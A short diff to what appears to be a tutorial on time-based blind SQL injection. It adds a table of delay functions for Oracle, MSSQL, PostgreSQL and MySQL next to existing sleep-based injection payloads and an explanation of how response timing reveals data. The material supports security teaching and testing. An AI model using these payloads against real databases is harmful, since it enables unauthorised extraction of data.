@@ -9,6 +9,12 @@ You need to actively modify the function used in the main part of the code and p
 ' or sleep(3)
 abc' or sleep(3) and 'a'='a
 ```
+```
+Oracle      dbms_pipe.receive_message(('a'),10)
+MSSQL       WAITFOR DELAY '0:0:10'
+PostgreSQL  SELECT pg_sleep(10)
+MySQL       SELECT sleep(10)
+```
 It involves sending SQL queries to the database that force it to wait for a specified amount of time before responding. 
 By measuring the server's response time, an attacker can infer whether certain conditions are true or false, thereby extracting information from the database without direct feedback.
 
